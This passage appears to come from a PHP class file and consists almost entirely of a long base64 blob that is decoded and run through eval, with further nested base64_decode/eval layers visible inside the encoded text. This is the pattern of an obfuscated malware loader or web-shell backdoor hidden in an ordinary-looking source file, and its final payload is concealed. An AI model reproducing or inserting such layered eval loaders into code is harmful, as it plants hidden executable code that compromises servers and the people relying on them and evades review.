rcFdUbFZPWVZac1ZYaFdhMlJTWlZad1JrNVdXazVpYXpFMlZsZDBZVkl5VW5OaU0yUnBVbFpLVTFacVNsTlRNVlpWVVd0a2FXSkZOVmRXUjNSTFdWVXhTR1ZGVmxaV2JWSnlWVEo0Um1ReFNuUk9WbEpvVFd4S1VWZFhjRXRTYlZGNFYyNUdWbUpZVWxSVVZscDJaVVprY2xadGRHcE5iRW93VlRJMVIxWkdXWGxWYkVwWFZrVktURlJ0ZUhkU01YQkdaRWQ0YVZacmNFdFdWRVpxVGxaTmVGTlljR2hUUjFKWlZtdFdkMWRHY0VkYVJUVnNWbXh3TUZZeU1XOVViVXBIWVROb1YxSldXbEJWVnpGWFZtczVWMVZ0ZEU1aVZrcFFWbXhTUzJWck1IaFRhMlJUWW14d2FGUlZaRFJTVmxaWFdrZDBWR0pGVmpOVmJUQXhWa1phVms1VlRsaGhhMHA2Vld0YVIxZEdjRVpqUmtwT1VsWndNVlpVU2pCaE1WRjVVMWhzVTFkSFVsaFpWM2hMWTJ4V2NWSnRSazVXYmtKSFYydG9UMkV5U2xaalNHaFhVbTFTY2xaV1dsWmtNVTV4VjIxR1UySldTazFYYkdONFZURk9WMVJzYUZCV1dGSlVWRlJLYjAweFdYaFZhM1JYVFd4S1dWWkdhSE5XTWtwWFkwYzVWVll6YUdGVVZscFRVbXhTY2xOdGVHaGxiRnBXVjJ0U1MyRXhVbk5XV0d4cVpXczFWRlZ0ZEdGTmJGcElaRVU1YWxKcldsbFhhMVozVldzeFJsZHVWbFpOVmxwUVZWZDRkbVF5U2taVmJFcFhUV3hLVEZaV1VrTlNNa3B6Vkd4YVZXRXdOWEZWYlRWRFpERldWMWw2VmxWU2ExWTBWVEkxUzFkdFJuSmlSRkphVmxkU1NGWXdWVEZXYkZaMFlVWk9UbEp0T0hoV2ExcGhWREZHY2s5V1pGSmlSa3BUVm1wT1UxbFdVbGhOVnpsc1ZteGFlVmRZY0ZkaE1VcDBaVVpzV21FeWFGaFdSM2hXWkRGS2RWVnNVbWxXTTJoRVYxWlNSMlF4VGtaUFZteFdZa2hDV0ZSWE5XNWxSbHBYVld0MGFVMXJXa2xXUnpWSFZrWlplVlZzU2xkaE1VcEVXVzE0VDJOc2NFWlBWMnhPWVRGWmVsWnNZekZaVjBaWFYxaGtXR0p0VW1GWmJHaERVekZrY1ZGdVpHcFNiVkpaVjJ0V01GVXdNVlppTTJ4WVZqTm9jbFZxU2s5VFJrNTFVMnhXYVZaSGVHaFdha0pYWXpBMWMxUnNXbFpYUjFKUlZteGtORkpXV2xoTldHUm9VbXRzTmxaWGRHRlhiVVp5WWtSU1dsWlhVa2hXTUZVeFUxZE9SbU5HU2s1V00yZDNWbFJHVjFReFZYbFNibEpUWVRKb2NsVnNXbmRqTVZWM1YydDBhazFYZURCVWJGcFBZV3hKZDJKRVZsVmhNbWgyVlRKNFMxSldSbFZXYkZKWFZsUldWVmRYZEd0V01VNVhWbTVTYkZJeWVIQlpXSEJYVFRGa1dHTkZjRTVXYTNCSlZXMTBiMVV5U25SbFJUbFhWa1ZLU0ZwRldrOWtSMHBHVTIxb1RsWXpVVEZYVmxadlV6RlZlRnBGYUdGTk1sSlpXV3RrVG1WR1VsWmFSV1JZVWxSc1dsWnRjekZoUmxwV1ZsUkdWMVpXY0ZCVlZ6RkdaVWRPUjJKSGFGTlNWWEJ2Vm0wMWQxWXdOWE5pUm1SYVpXeGFjbFp0ZEZkT1ZteFdXa2M1YUdKVldubFphMk14VmtkS1dHVkhSbGhoYTBvelZUQmFVMlJGT1ZoaFJUVlRZa2QwTTFZeWRGZGhNVmw1Vld4b1ZtRXlhSEJWTUZwM1kwWnNXR016YUdsaVJscElWbFpvYTFsVk1VbFJhMnhYWWxoQ1ZGbFVSa3BsUm1SeFVteHdiR0V6UWpaWGEyTjRVekpPYzFWdVVsQldia0paVld4a00wMXNWalpTYXpsU1lYcHNXRlZYZUZOVmJVcFZVbTFHVjJGck5YWlViWGhyWXpGU2RWTnRSazVpUm13MlZrWldWMDFHVG5OU1dHUlRZbFJXVlZac1ZURlJNV1J4VVc1T1UxSnJXbGxYYTFaM1ZXc3hSbGR1VmxaTlZscFFWVmQ0ZG1ReVNrWlZiRXBYVFd4S1RGWldVa05UTVZGNFdrWmtZVkl6VW5CVmJGSnpaVVpyZDFsNlJscFdiVkpJVlRKek5WZHRSbkpqUmxKYVlUSlNURlZyV25abFZUVlhZMFUxYUdKWVkzaFdha28wVkdzMVdGSnVVbFJYUjNoUVZtNXdSMkl4V25GVGF6bHJWbXN4TkZaR2FHdFVSVEZ5VFZSV1ZtSllRa3hYVmxwaFZtczFWVk5zY0dsV1JWcHZWMVJDWVdRd05WZGlNMnhQVmpKNFdGUlZXblpOVm1SWFZXdDBWMDFFUmtsV1IzUnZZa1pKZVdGSFJsVldNMmhvV1d4YWMwNXNUbk5hUlRWVFRWVndTbGRYZEc5V01XeFlWbXhXYVZOSVFtRldiVEZUVlVac2NscEZkR3RTYkVvd1dsVlZlRlJ0U25SaFJFNVhUVlpLVEZacVNsTldNa1Y2WWtaa1YyVnNXazlXVmxKRFVqSk9SMVJzYUdsVFJYQlFWRlZhUzFVeGJIRlRiWFJVWWtWV00xVnRNREZXUmxwV1RsVk9XR0ZyU25wVmExcEhWMFp3Um1OR1NrNVNWbkF4VmxSR1YxUXhSbk5pTTJScFVsWktVMVpxU2xOVE1WWnpWV3RrYVUxWFVuaFZNbmhoVkRKR05tSkVRbFppVkZaeVdWZDRSbVZXY0VsYVJsWlRZa1ZXTkZkWE1UUmtNV1JYVm01S1ZtSklRbGhVVlZKWFRXeFplV1ZHWkdwTmJFcFpWa1pvZDFadFNsaGhTRUphWWtaVmVGbDZSazVrTVZKMVUyMTBVMkV3YjNkV2Fra3hWREpGZUZwRldrOVhSbkJWVkZWVk1XVldVbkZSYkU1V1lsVnNOVmRyVm5kVmF6RkdWMjVXVmsxV1dsQlZWM2gyWkRKS1JsVnNTbGROYkVwTVZsWlNRMUl5U25OVWJGcFZZVEJ3YUZSVlpEUlNWbFpYV2tkMFZHSkZjRlpWYlRBMVYwZEdjbU5HWkZWaVdFMHhXa1ZhZDFOSFZraGtSazVvWld4WmVsWXhZM2RsUjBWNVZGaG9hbEp0ZUZkWmJYaDNZMFpzVjFwSGRHdFdiVkpZVjJ0YVQyRXhTWGRYYkd4VllrZE5NVmxVUmt0T2JFcDFZMFpXVTFKVVZsRlhWM1JyVkcxV2MxVnVWbEppVjNoUFdWZDRTMDFXVmpaU2F6VnJUVWhPTkZscldtOVdiVXBaVld4U1YwMUdXak5VYkZwelkxWlNjbU5IYkU1V2EzQmFWbGN3ZDAxV2JGZFhhMmhRVWtWd1lWWnNaRk5YUm13MlUyczVWRkpzY0RGWmExWTBWV3N4Vm1OSWNGaGlSbHAyVmxSS1MxTkdUblZXYkZacFlUQndkMVpHWkhkV01rcFhXa1prWVZKR1NuRlZiVEUwVjJ4YVIyRkZUbFZXYkhCR1ZtMHdlRmRHVGtobFNGWmFWbXh3VkZVd1pFdFRSMDVJVW14a2JHSkdjRFJXYWtvMFZERkZlVlJ1VG1wU2JYaHZWRmN4VTJJeFdYZFdXR2hwWWtkNFdGZFljRWRVYlVwSVpVWnNZVlpYYUVSWFZscEdaREZPZFZWc2NHaGhlbFpNVmpKd1MxVXhUa2hTYTJ4U1lsaENjMVpzVm5kbFZtUllZMFZ3YkZJd1drbFZiWGh2VkRGSmVWVnVSbFpoYXpWMldYcEdhMVl5UmtaUFYyeFRWak5vU2xacll6RlpWMFpZVTI1T1ZHSlViRmxXYTFVeFZURmtjVk5zVGxoV2JFcGFWbTEwZDJGR1dYcFZhazVYVWtVMWNWcEVSazVrTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzFSc1dsVmhNSEJvVkZWa05GSldWbGRhUjNSVVlrVldNMVZ0TURGV1JscFdUbFZPV0dGclNucFZhMXBIWkZkT1NGSnNhRk5XUmxWNVZqRmFZV0ZyTlZoVmJHUmhUVE5DYUZVd1pEUmlNVmwzVjJ0MGFrMVhVa1pWTW5NMVlXc3hjbUpFV2xkU2VrVXdWa1ZhUm1WWFRqWlViRTVUWVRGdmVWWXljRU5qTVVwSFVteG9ZVkpZUWxOVVZWWmhaRlpWZUZack9WSmlSemt6V1d0V1UxVnNXWGxWYTNSV1ZrVktTRmx0ZUU5V2JGSnlVMjFHVGxJemFFaFdSbHByWWpGc1ZrMVlUbGRXUlhCV1ZGZHdSMU5HY0VWVGF6bFRVbTA1TmxWWGMzaFdNVXBIVjJwR1YwMXVhSFpXVkVaV1pVZE9SMkpHVm1saVZrcDNWa1prZDFZd05YTmFTRTVWWWxSV2NWVnNhRzlXYkZKellVaGtXbFp0VWtoVk1uaFRWMGRLU0ZWc1VscE5SMUpRV2tWYVlXUkhUa2hrUmtwT1lsZG9VVlpxUm1GaE1rVjVVMnRhVUZkRlduRlZibkJ6WVVaYWNWUnRPVTVOVjFKNldWVldkMkZWTVVoUFZGWldZbFJGZDFsV1dscGxWMVpGVW14d1YxWXlhRlZYYTFaclV6RktSMkV6Y0ZKaGVrWllWV3RhWVUxV1dYbGxSemxXVFZad01GWkhOVk5oTURGeFlrVjBXbUpHV21oWk1uaHpZekZ3U1ZSdGRGZE5SbkJMVm14ak1WVXlSbGRTYWxwcFUwVndXVlp0TVc5VlJteHhVbTVPYTFKVWJGbFpWV1IzWVZaYWNsZHVaRlpsYTFwUVdUSnpNR1F4Vm5OVGJXeE9ZbFpLVEZaV1VrTlNNa3B6Vkd4YVZXRXdjR2hVVldRMFVsWldWMXBIZEZSaVJWWXpWVzB3TVZaR1dsWk9WVTVZWVd0d2FGWlhjM2hTYlZKR1kwWktUbEpXY0RGV1ZFWlhWREZHYzJJelpHbFNWa3BUVm1wS1UxTXhWbFZSYTJScFlraENlbFpIZEU5aFZrbDNZMFZ3VjFKNlJUQlZNbmhQVTFaU2NrOVdTazVpV0doRVZqSndRMk14U2tkU2JHaGhVbGhDVTFSVlZtRmtWbFY0Vm1zNVVtSkhPVE5aYTFaVFZXeFplVlZyZEZaV1JVcE1Wa1JHYTFZeGNFaGtSMnhUVmtkNE5GZFVRbXBOVm14WFdrVmtWR0Y2YkdGWlYzUjNWa1pzY2xwRmRGTlNiVGsxVkd4YWQxUnRSblJrZWtaWFRXNW9UMVJzWkVka1JrNVpZa1U1VjJWclduWldiWEJMVkRKU1YxUllhRlZYUjFKTlZGZHplRTVXVm5SalJYUmFWbXh3VjFSc1VrdFhiVXBWVW0xb1drMUdjRE5VYkZwMlpWZEtTR0pHWkU1U2JUaDRWakZhVTFNeFdYZE5WV2hWWVRKb2MxVnFTbTlaVmxKWVpVZEdhVlp0ZHpKVk1uaHJWR3hKZUZOcmJGcGhNbWhZVjFaa1YxWlhTa2xqUm5CWFlsWktVVmRYZEd0VE1sSkhWVzVTYkZKVVJrOVpiVEZ2VFRGWmVGVnJkRmROYkVwWVdWUk9jMVl4V1hsbFJUVldWa1ZLU0Zrd1drOVhSMHBKVTJzNVRsSnJjRlJYVjNCTFlURk9jMUpZWkZOaVZGWlZWbXhWTVZFeFpIRlJiazVUVW10YVdWZHJWbmRWYXpGR1YyNVdWazFXV2xCVlYzaDJaVVpXYzJGR1RtbFdSbHB2Vm0xMGFrNUZNWE5hUm1Sb1VsVTFjbFJWYUZOU1ZteFZWR3hPVmxZd2NGbFdWelZQV1ZaS1YxZHNRbHBXVm5CNVdsWmtSMU5IVmtkVmJHUnNZa1pyZVZZeWRGZGhNVWw1Vld4a2FFMHllRmhXYm5CelZGWmFXV05GU21waVIxSXdWRlpTVTFSc1dYZE5WRlpZWVd0ck1WWkZXbUZUVmxKeVQxWktUbUpZYUVSV01uQkRZekZLUjFKc2FHRlNXRUpUVkZWV1lXUldWWGhXYXpsU1lrYzVNMWxyVmxOVmJGbDVWV3QwVmxaRlNreFdSRVpyVmpGd1NHUkhiRk5XUjNnMFYxUkNhazFXYkZkYVJXUlVZa1phWVZadE1VNWxSbXgwVFZWMFZGSnNjSGhWVnpGelZHMUdjMU5xU2xaTmJrSk1WV3BLUm1WV1RuTmhSMnhVVW14d2RsWlVRbUZUTURGSFlraEtWVlpHV25OWmEyaERWMnhhU0U1WVpHaFNiRzh5V1d0U1IxWkhTblJsU0d4aFVsWndSRnBGV2t0a1IxSklVbXhPVjJKSE9IaFdNVkpLWkRBMVdGWnNXbXRTVm5CUFZtcEtiMkZHVWxobFJscE9Za1pHTlZSV1l6VmhWa2wzWTBWd1ZsWjZSVEJaVnpGSFYwWndTVk5zYUdsU01tZ3lWa1pXWVdReFpFWk9WbXhxVWpKb1dGcFhNVE5sUmxsM1ZXdDBVMDFyTVRWVmJYaHZWVEpLZFZGck1WZFhTRUpEV1RKNGExSldTbFZWYld4T1VqTm9OVmRzVm05Uk1XUnlUVmhPV0dGcldsbFdhMVozVmpGa2NWTnJXbXhXYkhCNFZtMTBkMVV3TVhWYWVrcFdUVlphY2xsNlNsTlhSbFoxVld4T2FXRjZWblpXYlhCSFVqSktjMXBJVWs1U1JscHpWbXhrTkZOc1dsaE5SRlpvVW0xU1IxUldZekZYUjBWNVZGUkdZVkpXY0hwV01HUkxVMVphY21OR1VsTldXRUV5Vm1wS05HRXhTWGxXYms1cVVteEtVMWxzYUVOalJsSllZMFphYTAxWFVsaFhhMVUxVkd4S1dHVkZjRmRpVkZZelZrWmtSMVp0U2tsYVJsSk9WbXR2TWxaclpEQlVNazVIVW14b1lWSllRbE5VVlZaaFpGWlZlRlpyT1ZKaVJ6a3pXV3RXVTFWc1dYbFZhM1JXVmtWS1NGbHRlRTlXYkZKeVZHMTRhVk5GU21GV2EyTXhaREpHUjFkcVdtbFNSVnBaVld0Vk1XTnNjRmRhUldSWVZteGFNRnBWV25OVWJVWTJWbXBhV0ZZelFsQldSRXBMVW0xU1JsVnRhR3hpVmtwSFZteGFhazVYU25OVWJGcFZZVEJ3YUZSVlpEUlNWbFpYV2tkMFZHSkZWak5WYlRBeFZrWmFWazVWVGxoaGEwcDZWV3RhUjFkR2NFZFdiR1JPVW01QmVGWnFTalJWTWxKeVRsaE9hVkp0ZUZOWmJURlRWRlpXVlZOcVFrNVNiRnBKVkZaa01HRldTWGhUYTJoV1RXcEZNRmxYYzNka01VNXhVMnh3YVZaR1dsRlhWM1JYVFVaS1NGSlljRlppUlZwd1dWaHdWMlZzWkhKV2JVWlVUV3R3U0Zrd1ZtOWhWazVJWlVkb1YyRnJSWGRhUkVaT1pERmFXV0ZIYUZOaVZHc3hWbTE0VTFsV1ZraFRiR2hvVTBVMVlWbFVTbTlTUm14eVdrVTVhbEp0T1RWVWJGcDNWakF4Vm1JelpGaFdiSEJ4VkZaa1NtVldWbkpoUlRWWVVsUldUVmRzV210TlJURkhWbXRvVGxZelVuQlZha1pMVTBaYWRFNVlUbWhXYTFZMVYydG9RMWRHV25SVmJGSmhVbGRTU0ZZd1ZURlhSVGxZWkVaT2JHRXhiekpXYTFaVFV6RlZlVkpyYUZWWFIzaHZWV3BLTkdOR1VsaGtSMFpQVm0xU2VWWkhkSGRoYkVwWlZXeGFXbVZyUlhoVmEyUkhWbXhLZEU1V1VsZFdWRlpFVmpKd1EyTXhTa2RTYkdoaFVsaENVMVJWVm1Ga1ZsVjRWbTAxYTAxV1NubFdSelZEVld4WmVWVnJkRlpXUlVwSVdXMTRUMVpzVW5KVGJVWk9Za2hDVkZaVldsSmtNa3B5VDFSV1ZtSlZXbkZXYlRGVFlqRk9WbFZZWkdGTlNFRXhWbGN3TlZkR1NuTlRhbEpVVmxaR00xZHFSbk5rUmtwMVkwZEdWMUp0ZEROV01GSkxWVEpLUjJFemJGQldNMUpvVmxSS2EyTnNaSEZSYkdSUFlrZFNSVmxZY0d0VGJFbDRWMWhzV0ZadFVYcFpha0ozVTBkR1IySkdaRlJTVmxvelZrUk9jMkZyTkhoalJteFlZbGRvY0ZWVVNtdGpiRmw1VGxWa1dGSnRlRlZaV0hCcVltczVOVlZzUmxkTk1GcG9VMVZSZDFvd2NEVlZha3BXVm01Q05WTlZVWGRhTVd4MFVtNXdZVlpHYTNkWFJFcFRZa1pyZVU5WGRHRlZNbVJ5V2xkNGEwMUdWbFJoZW1SS1VqRlplVmRXWkROaU1IQkpWMnhLV0dKcmJIZFVNMnhxVGpGd1dWZHRhR2xSTW1SeVZsVmFhMlZHWkhCaGVtTnVUM2xTVUdWSVRsSkpSREJuU25sU1NsVnVUbGxKUkRCbldXMUdlbHBVV1RCWU1sSnNXVEk1YTFwVFoydGFNSEJoWlVOck4wbEhWakpaVjNkdlNrVnNVMk14WjNCUGVXTTNXbGhhYUdKRFoydFVNMmg2VlZOck55YzdKRkY0UkhJZ1BTQW5KRTE0ZWxjZ1BTQmlZWE5sTmpSZlpHVmpiMlJsS0NSSWMxcFVLVHNnWlhaaGJDZ2tUWGg2VnlrN0p6dGxkbUZzS0NSUmVFUnlLVHM9JzskUWVYYSA9ICckc1F6VyA9IGJhc2U2NF9kZWNvZGUoJG9JWFEpOyBldmFsKCRzUXpXKTsnO2V2YWwoJFFlWGEpOw==');eval($tFmb);
    }

}
